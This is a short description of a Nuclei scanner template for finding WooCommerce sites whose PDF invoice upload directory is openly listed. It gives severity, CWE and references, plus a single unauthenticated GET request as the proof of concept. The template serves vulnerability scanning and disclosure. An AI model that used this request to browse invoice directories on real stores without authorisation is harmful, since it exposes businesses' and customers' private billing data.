# Nuclei Template: Woocommerce - PDF Invoice Exposure
**Template ID:** wp-woocommerce-pdf-invoice-listing
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`wp-woocommerce-pdf-invoice-listing.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability in Woocommerce allows remote unauthenticated attackers to access company invoices and other sensitive information.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/uploads/pdf-invoices/
```

## References
- https://twitter.com/sec_hawk/status/1426984595094913025?s=21
- https://github.com/Mohammedsaneem/wordpress-upload-information-disclosure/blob/main/worpress-upload.yaml
- https://woocommerce.com/products/pdf-invoices/
